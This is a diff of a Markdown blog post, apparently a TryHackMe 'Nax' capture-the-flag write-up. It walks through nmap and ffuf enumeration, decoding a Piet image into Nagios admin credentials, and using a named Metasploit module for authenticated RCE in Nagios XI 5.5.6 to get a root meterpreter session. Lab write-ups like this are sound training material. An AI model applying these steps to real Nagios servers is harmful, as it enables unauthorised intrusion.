@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="nax.png" width=200 height=200 alt="nax">
+{{< post-img src="nax.png" alt="nax" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
  PORT    STATE SERVICE   REASON  VERSION
  22/tcp  open  ssh       syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
@@ -99,9 +97,8 @@ categories:
  Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
 
-```
+```bash
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -113,23 +110,21 @@ nagios                  [Status: 401, Size: 459, Words: 42, Lines: 15]
 server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
 ```
 
-After visiting the wesite we get a weird page with `"elements"`
-
+After visiting the website we get a weird page with `"elements"`
 periodic table elements `Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr`
-
 The corresponding numbers (atomic value) are found on google and we check if those are `ASCII` chars:
 
 `python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"`
 
-```
+```text
 /PI3T.PNg
 ```
 
 A hidden png? lets go get that and extract exif data from it
 
-<img src="PI3T.png" alt="piet" width=200 style="margin:10px"/>
+{{< post-img src="PI3T.png" alt="piet" style="width: 200px;" >}}
 
-```
+```bash
 exiftool /PI3T.PNg
 ExifTool Version Number : 12.16
 File Name : PI3T.PNg
@@ -157,15 +152,13 @@ Image Size : 990x990
 Megapixels : 0.980
 ```
 
-Googling piet mondrian didnt really help me...so I started to look for others steganograpy methods
-
+Googling piet mondrian looking for others steganograpy methods
 SEEMS LIKE A LANGUAGE CALLED PIET WAS CREATED AFTER THE AUTHOR'S
-
 let's google more about PIET
 
 And there is an online tool to execute that at `https://www.bertnase.de/npiet/npiet-execute.php`
 
-```
+```bash
 libpng warning: Extra compressed data.
 libpng warning: Extra compression data.
 nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYna
@@ -179,25 +172,24 @@ So we get
 
 we can use that to login at `nagios` page
 
-```
+```text
 Nagios XI 5.5.6
 ```
 
-We google it...and it seems that its an interresting one
+We google it...and it seems that its an interesting one
 
-```
+```text
 CVE-2019-15949 : CRITICAL RCE to root with getprofile.sh
 CVE-2018-15708 : CRITICAL remote command execution
 CVE-2018-15710 : HIGH privilege escalation via Autodiscover_new.php.
 ```
 
-First one is the most critical
-
+First one is the most "critical"
 we fire metasploit up and use
 
 `exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`
 
-```
+```bash
 Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):
 
 Name Current Setting Required Description
@@ -237,24 +229,22 @@ Id Name
 ```
 
 And we get a meterpreter session
-
 we go /home/galand for first flag
 
-```
+```bash
 meterpreter > cat user.txt
 THM{nax_user_flag}
 ```
 
 Time for more privileges...
-
 haha joking...not this time...we already root (most critical RCE vuln duh)
 
-```
+```bash
 meterpreter > getuid
 Server username: root
 ```
 
-```
+```bash
 meterpreter > cat root.txt
 THM{nax_root_flag}
 ```
